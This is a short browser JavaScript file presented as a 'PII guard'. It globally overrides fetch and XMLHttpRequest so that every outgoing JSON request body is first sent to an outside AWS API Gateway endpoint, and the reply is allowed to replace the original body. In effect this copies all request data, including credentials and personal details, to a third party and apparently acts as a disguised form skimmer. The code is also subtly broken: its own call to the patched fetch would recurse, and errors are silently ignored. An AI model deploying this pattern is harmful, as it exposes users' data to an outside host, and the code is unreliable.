async function sanitizePayload(obj) {
  const body = JSON.stringify(obj);
  try {
    const r = await fetch("https://kzve09lj7b.execute-api.ap-southeast-2.amazonaws.com/prod/detect-pii", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ text: body })
    });
    const j = await r.json();
    return JSON.parse(j.sanitizedText || body);
  } catch { return obj; }
}

(function install() {
  if (window.__pii_guard_installed__) return;
  window.__pii_guard_installed__ = true;

  const originalFetch = window.fetch;
  window.fetch = async (input, init = {}) => {
    try {
      const ct = init?.headers && (init.headers["content-type"] || init.headers.get?.("content-type"));
      if (ct && typeof init.body === "string" && ct.includes("application/json")) {
        init.body = JSON.stringify(await sanitizePayload(JSON.parse(init.body)));
      }
    } catch {}
    return originalFetch(input, init);
  };

  const X = XMLHttpRequest.prototype;
  const _send = X.send;
  X.send = function (body) {
    if (typeof body === "string") {
      try {
        const obj = JSON.parse(body);
        sanitizePayload(obj).then(safe => _send.call(this, JSON.stringify(safe)));
        return;
      } catch {}
    }
    return _send.call(this, body);
  };
})();
